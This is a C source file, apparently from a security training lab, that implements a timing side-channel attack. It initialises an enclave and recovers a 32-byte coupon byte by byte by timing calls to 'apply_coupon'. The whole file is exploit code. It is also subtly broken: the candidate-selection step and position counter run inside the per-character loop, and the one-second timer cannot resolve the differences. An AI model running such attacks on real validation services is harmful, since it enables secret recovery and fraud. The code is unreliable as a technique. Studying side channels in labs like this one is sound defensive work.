
#include "stdafx.h"
#include "exploits.h"
#include "common_enclave_actions.h"


void e1_timing_attack(char* server_ip, int iport, char* library_folder)
{
	// create an enclave

	// do apply coupon with time measurement for each byte until first 32 byte coupon is recovered
	// the rest of coupons left as an excersise to the practitioner

	if (!load_enclave())
	{
		printf("\n Can not create enclave for timing attack ...");
		return;
	}
	if (!init_enclave(server_ip, library_folder, iport))
	{
		printf("\n Can not initialize enclave for timing attack ...");
		return;
	}
	// 
	char *alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_+-=!@#$%^&*()~`;:";
	char coupon[33] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	bool res = false;
	int syms_in_alphabet = (int)strlen(alphabet);
	int *time_diffs = (int*)malloc(sizeof(int)*syms_in_alphabet);
	int i, j, try_count = 100;
	int wrptr = 0;
	do
	{
		memset(time_diffs, 0, sizeof(int)*syms_in_alphabet);
		for (i = 0; i < syms_in_alphabet; i++)
		{
			coupon[wrptr] = alphabet[i];
			for (j = 0; j < try_count; j++)
			{
				time_t start, end;
				time(&start);
				res = apply_coupon(coupon);
				time(&end);
				if (res)
				{
					printf("\nRecovered coupon: %s", coupon);
					return;
				}
				time_diffs[i] += (int)(end - start);
			}
			int max_diff = 0;
			int recovered_index = 0;
			for (j = 0; j < syms_in_alphabet; j++)
			{
				if (time_diffs[j] > max_diff)
				{
					max_diff = time_diffs[j];
					recovered_index = j;
				}
			}
			coupon[wrptr] = alphabet[recovered_index];
			wrptr++;
		}
	} while (!res && wrptr < 32);

	if (!res || wrptr >= 32)
	{
		printf("\n timing attack failure, try again ");
	}

}
